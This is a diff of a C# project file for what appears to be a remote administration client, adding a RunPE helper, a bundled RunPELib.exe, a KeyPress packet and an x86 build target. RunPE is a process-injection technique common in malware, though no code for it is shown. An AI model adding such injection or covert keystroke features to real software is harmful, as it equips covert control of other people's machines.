@@ -25,7 +25,7 @@
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
-    <PlatformTarget>AnyCPU</PlatformTarget>
+    <PlatformTarget>x86</PlatformTarget>
     <DebugType>pdbonly</DebugType>
     <Optimize>true</Optimize>
     <OutputPath>..\Bin\Release\</OutputPath>
@@ -65,6 +65,9 @@
     <Compile Include="Core\Encryption\AES.cs" />
     <Compile Include="Core\Encryption\SHA256.cs" />
     <Compile Include="Core\Helper\FileSplit.cs" />
+    <Compile Include="Core\Helper\RunPE.cs">
+      <SubType>Code</SubType>
+    </Compile>
     <Compile Include="Core\Helper\UnsafeStreamCodec.cs" />
     <Compile Include="Core\Information\OSInfo.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
@@ -92,6 +95,7 @@
     <Compile Include="Core\Packets\ServerPackets\GetProcesses.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetStartupItems.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetSystemInfo.cs" />
+    <Compile Include="Core\Packets\ServerPackets\KeyPress.cs" />
     <Compile Include="Core\Packets\ServerPackets\KillProcess.cs" />
     <Compile Include="Core\Packets\ServerPackets\Monitors.cs" />
     <Compile Include="Core\Packets\ServerPackets\Rename.cs" />
@@ -232,7 +236,9 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
   </ItemGroup>
-  <ItemGroup />
+  <ItemGroup>
+    <None Include="Resources\RunPELib.exe" />
+  </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
     <PostBuildEvent>copy "$(TargetPath)" "$(TargetDir)client.bin" /Y</PostBuildEvent>
